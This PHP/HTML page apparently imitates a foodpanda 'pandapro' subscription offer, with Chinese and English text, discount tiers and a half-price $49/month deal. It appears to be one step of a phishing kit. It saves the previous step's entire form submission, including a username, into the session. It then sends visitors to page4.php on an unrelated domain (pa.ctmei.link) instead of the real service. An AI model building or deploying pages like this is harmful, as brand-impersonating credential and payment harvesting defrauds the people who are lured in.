<?php
session_start();
//require_once 'config.php';
//include('partials/header.php');
#include('header-him-banner.php');


if (isset($_POST['submit']) || isset($_POST['username'])) {
    $_SESSION['step1Data'] = $_POST;
}

?>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">

<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.14.3/dist/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  
    <style>
        body {
            /*background-image: url('https://pa.ctmei.link/page2/panda.png');*/
            background-size: cover;
            background-repeat: no-repeat;
            height: 100vh;
            margin: 0;
            
            align-items: center;
            justify-content: center;
        }

        h1 {
            color: white;
            font-family: 'Arial', sans-serif;
        }
		.col-lg-12 img {
            width: 100%; /* Make the image fill the entire width of the column */
            height: auto; /* Maintain the image's aspect ratio */
            max-width: 100%; /* Ensure the image doesn't exceed its original size */
            display: block; /* Remove extra space beneath the image */
            margin: auto; /* Center the image within the column */
        }
		
		.red-check {
            color: red;
			font-size: large;
        }
		
		.form_title{
			font-weight: bolder;
		}
		.form_dis{
			font-size: 26px;
		}
.btn-success {
    color: #fff;
    background-color: #FD2C84;
    border-color: white;
	border-radius: 10px;
	width: 60%;
    height: 60px;	
}
.btn-success:hover, .btn-success:focus, .btn-success.focus, .btn-success:visited, .btn-success:active, .btn-success.active, .open>.dropdown-toggle.btn-success {
    color: #fff;
    background-color: #FD2C84 !important;
    border-color: white;
	border-radius: 10px;
	width: 60%;
    height: 60px;
	outline:none;
	box-shadow: none !important;
}

.h3, h3 {
    font-size: 31px;
}

button:focus,
button:active{
	border:1px solid black;
	background:none;
	padding:0;
}

:focus:not(:focus-visible) {
  outline: 0;
  box-shadow: none;
}

         .moving-row {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #f0f0f0;
            padding: 20px;
            border: 1px solid #ccc;
            transition: top 0.3s ease-in-out; /* Adding a smooth transition effect */
        }
		
    </style>


<body>


	<div class="row">
		<img src="page2/panda.png" alt="" style="width: 100%;">
	</div>
	
	<div class="row">
		<!--<div class="col-sm-3" style="padding:0px;">
			<img src="page2/icon.png" alt="" style="width: 100%;">
		</div>
		-->
		<img class="col-sm-2" src="page2/icoo.png" alt="" style="padding: 0;">	
		
		<div class="col-sm-10" style="background-color: #FCF1F5; font-size: 30px;/*xxx-large; padding: 65px;*/ color:FD2C84; padding: 20px;">
			<b>pandapro 推薦給最懂生活的你
			<br>
			訂閱費限時半價 , 享受無限次免費外送、指
			<br>
			定餐廳專屬優惠等 , 享受生活、立即訂閱 !
			</b>
			<!--<p style="background-color: #FCF1F5; padding: 20px;"> Add your Content here</p>!-->
		</div>
	</div>
	
	<br><br>
	<div class="row">
		<div class="col-sm-12">
			<p style="font-weight:bold; font-size: xxx-large; text-align: center;">成為pandapro,現享獨家優惠</p>
		</div>
	</div>	
	<br><br>
	
	<div class="row" style="margin-left:80px;">
		<div class="col-sm-7">	
			<h3 class="form_title"><i class="fas fa-check-circle red-check"></i>&nbsp;Welcome voucher</h3>
			<p class="form_dis">&nbsp;&nbsp;&nbsp;RM15 off on orders above RM40</p>
			<p class="col-sm-5" style="background-color:lavender;color: cornflowerblue;font-weight: bold; border-radius: 25px; font-size: 25px;">&nbsp;&nbsp;&nbsp;1 voucher</p>
		
		</div>
		<div class="col-sm-5">
			<img src="page2/1.png" alt="" style="width: 70%;"> 
		</div>
	</div>
	
	
	<div class="row" style="margin-left:80px;">
	   <div class="col-sm-7">
			<h3 class="form_title"><i class="fas fa-check-circle red-check"></i>&nbsp;Free delivery</h3>
			<p class="form_dis">&nbsp;&nbsp;&nbsp;On all orders above RM 25</p>	
			<p class="col-sm-7" style="background-color:lavender;color: cornflowerblue;font-weight: bold; border-radius: 25px; font-size: 25px;">&nbsp;&nbsp;&nbsp;12 orders/month</p>
		</div>
		
		<div class="col-sm-5">
		<img src="page2/2.png" alt="" style="width: 70%;">
		</div>
	</div>
 

	<div class="row" style="margin-left:80px;">
	   <div class="col-sm-7">
			<h3 class="form_title"><i class="fas fa-check-circle red-check"></i>&nbsp;15% off and up on restaurants</h3>
			<p class="form_dis">&nbsp;&nbsp;&nbsp;Valid for 10000+ restaurants</p>
			<p class="col-sm-5" style="background-color:lavender;color: cornflowerblue;font-weight: bold; border-radius: 25px; font-size: 25px;">&nbsp;&nbsp;&nbsp;Unlimited</p>
		
		</div>
		
		<div class="col-sm-5">
		<img src="page2/1.png" alt="" style="width: 70%;">
		</div>
	</div>
	
	
	<div class="row" style="margin-left:80px;">
	   <div class="col-sm-7">
			<h3 class="form_title"><i class="fas fa-check-circle red-check"></i>&nbsp;Extra 6% off pick-up</h3>
			<p class="form_dis">&nbsp;&nbsp;&nbsp;Valid for all pick-up orders</p>
			<p class="col-sm-5" style="background-color:lavender;color: cornflowerblue;font-weight: bold; border-radius: 25px; font-size: 25px;">&nbsp;&nbsp;&nbsp;Unlimited</p>
		
		</div>
		
		<div class="col-sm-5">
		<img src="page2/4.png" alt="" style="width: 70%;">
		</div>
	</div>


	<div class="row" style="margin-left:80px;">
	   <div class="col-sm-7">
			<h3 class="form_title"><i class="fas fa-check-circle red-check"></i>&nbsp;20% off shops</h3>
			<p class="form_dis">&nbsp;&nbsp;&nbsp;Valid for all shops on orders above RM45</p>
			<p class="col-sm-8" style="background-color:lavender;color: cornflowerblue;font-weight: bold; border-radius: 25px; font-size: 25px;">&nbsp;&nbsp;&nbsp;2 vouchers/month</p>
		
		</div>
		
		<div class="col-sm-5">
		<img src="page2/5.png" alt="" style="width: 70%;">
		</div>
	</div>
	
<!--	
	<div class="row" style="margin-left:80px;">
	   <div class="col-sm-7">
			<h3 class="form_title"><i class="fas fa-check-circle red-check"></i>&nbsp;Dine-in offers</h3>
			<p class="form_dis">&nbsp;&nbsp;&nbsp;Valid on all participating restaurants</p>
			<p class="col-sm-7" style="background-color:lavender;color: cornflowerblue;font-weight: bold; border-radius: 25px; font-size: 24px;">&nbsp;&nbsp;&nbsp;Available now</p>
		
		</div>
		
		<div class="col-sm-5">
		<img src="page2/6.png" alt="" style="width: 70%;">
		</div>
	</div>	
!-->	
	<br><br>
	
	<div class="row" style="margin-left:80px;" id="">
	   <div class="col-sm-5">
			<p style="font-size: 27px;"><s>$99/月 &nbsp;&nbsp;</s><img src="page2/icon.png" alt="" style="width: 8%;"></p>
			<p style="font-weight:bold; font-size: 30px;">$49/月</p>
		
		</div>
		
		<div class="col-sm-7">
			<button onclick="location.href='https://pa.ctmei.link/page4.php'"  type="button" class="float-none btn btn-success">立即訂閱方案</button>
		</div>
	</div>	
	
</body>

     <script>
        // Get the moving row element
        var movingRow = document.querySelector('.moving-row');

        // Listen for the scroll event
        window.addEventListener('scroll', function () {
            // Calculate the new top position based on the scroll position
            var newTop = 50 + window.scrollY;

            // Set the new top position for the moving row
            movingRow.style.top = newTop + 'px';
        });
    </script>
 <!--
<div class="wrap only_mobile">

    <div id="leftdata" style="height:26em;">	
	<h3 class="form_title">Welcome voucher</h3>
	<p class="form_dis">RM15 off on orders above RM40</p>
      
      <p style="margin-top:12pt; margin-left:24.95pt; text-align:justify; line-height:12.2pt">
        <span style="font-family:Calibri; font-size:10pt">1</span>
        <span style="font-family:Calibri; font-size:10pt; letter-spacing:0.35pt"></span>
        <span style="font-family:Calibri; font-size:10pt">voucher</span>
      </p>
	  
	 </div>
	 
	<div id="rightdata" style="height:26em;">
		<div>
			<img src="page2/1.png" alt="">
		</div>
	</div>
	  
	  
	  
	  
	<div id="leftdata" style="height:26em;">
	<h3 class="form_title">Free delivery</h3>
	<p class="form_dis">On all orders above RM 25</p>	
	
      <p style="margin-top:10.1pt; margin-left:24.95pt; text-align:justify; line-height:14.6pt">
        <span style="font-family:Calibri; letter-spacing:0.05pt">12orders/month</span>
      </p>	  
	</div>
	
	<div id="rightdata" style="height:26em;">
		<div>
			<img src="page2/2.png" alt="">
		</div>
	</div>

	
	
	<div id="leftdata" style="height:26em;">
	<h3 class="form_title">15% off and up on restaurants</h3>
	<p class="form_dis">Valid for 10000+ restaurants</p>
	
      <p style="margin-top:11.45pt; margin-left:24.95pt; text-align:justify; line-height:12.2pt">
        <span style="font-family:Calibri; font-size:10pt">Unlimited</span>
      </p>
	</div>

	<div id="rightdata" style="height:26em;">
		<div>
			<img src="page2/1.png" alt="">
		</div>
	</div>


	
	<div id="leftdata" style="height:26em;">
	<h3 class="form_title">Extra 5% off pick-up</h3>
	<p class="form_dis">Valid for all pick-up orders</p>
	
      <p style="margin-top:11.45pt; margin-left:24.95pt; text-align:justify; line-height:12.2pt">
        <span style="font-family:Calibri; font-size:10pt">Unlimited</span>
      </p>	
 
	</div>

	<div id="rightdata" style="height:26em;">
		<div>
			<img src="page2/4.png" alt="">
		</div>
	</div>
	
	
	
	  
	<div id="leftdata" style="height:26em;">
	<h3 class="form_title">20% off shops</h3>
	<p class="form_dis">Valid for all shops on orders above RM45</p>
	
      <p style="margin-top:11.55pt; margin-left:24.45pt; text-align:justify; line-height:14.6pt">
        <span style="font-family:Calibri; letter-spacing:0.1pt">2vouchers/month</span>
      </p>
	</div>

	<div id="rightdata" style="height:26em;">
		<div>
			<img src="page2/5.png" alt="">
		</div>
	</div>

	
	
	<div id="leftdata" style="height:26em;">
	<h3 class="form_title">Dine-in offers</h3>
	<p class="form_dis">Valid on all participating restaurants</p>
	
      <p style="margin-top:12.95pt; margin-left:24.45pt; text-align:justify; line-height:12.2pt">
        <span style="font-family:Calibri; font-size:10pt">Available</span>
        <span style="font-family:Calibri; font-size:10pt; letter-spacing:4.85pt"></span>
        <span style="font-family:Calibri; font-size:10pt">now</span>
      </p>
	</div>

	<div id="rightdata" style="height:26em;">
		<div>
			<img src="page2/6.png" alt="">
		</div>
	</div>	

</div>
-->

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<?php
#include('footer-him.php');
